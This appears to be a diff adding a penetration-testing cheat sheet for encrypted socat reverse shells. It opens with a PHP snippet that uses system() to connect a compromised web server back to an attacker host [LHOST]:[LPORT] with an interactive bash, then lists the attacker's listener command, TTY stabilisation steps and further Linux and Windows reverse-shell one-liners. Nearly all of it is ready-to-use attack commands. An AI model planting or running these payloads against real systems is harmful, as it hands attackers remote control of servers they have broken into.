@@ -1,0 +1,21 @@
+<?php
+    system('socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane');
+?>
+
+connect using listener:
+  socat OPENSSL-LISTEN:[LPORT],cert=[certfile],verify=0 FILE:`tty`,raw,echo=0
+
+stabilize using:
+  export TERM=xterm
+
+stabilize size by:
+  open alternate terminal on attacker machine and run: stty -a
+  on compromised machine use: stty [rows/cols] [number]
+
+non stable:
+  linux shell:
+    socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:/bin/bash
+  windows shell (no benefits over nc):
+    socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:cmd.exe,pipes
+  listener:
+    socat OPENSSL-LISTEN:[LPORT],cert=[certfile],verify=0 -
